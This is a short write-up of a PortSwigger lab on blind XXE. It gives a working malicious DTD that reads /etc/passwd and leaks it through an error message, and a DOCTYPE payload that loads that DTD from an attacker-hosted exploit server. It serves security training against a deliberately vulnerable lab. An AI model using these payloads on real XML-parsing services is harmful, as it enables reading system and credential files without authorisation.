# Exploiting blind XXE to retrieve data via error messages

## Description

[This lab](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages) has a "Check stock" feature that parses XML input but does not display the result.

## Reproduction and proof of concept

1. Click **Go to exploit server** and save the following malicious DTD file on thr server:

```text
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

When imported, this page will read the contents of ``/etc/passwd`` into the ``file`` entity, and then try to use that entity in a file path.

2. Click "View exploit" and take a note of the URL for your malicious DTD.
3. Exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. Visit a product page, click **Check stock**, and intercept the resulting POST request in Burp Suite.
4. Send it to Repeater, and insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:

```text
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

You should see an error message containing the contents of the ``/etc/passwd`` file.

## Exploitability

An attacker needs to use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file. The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
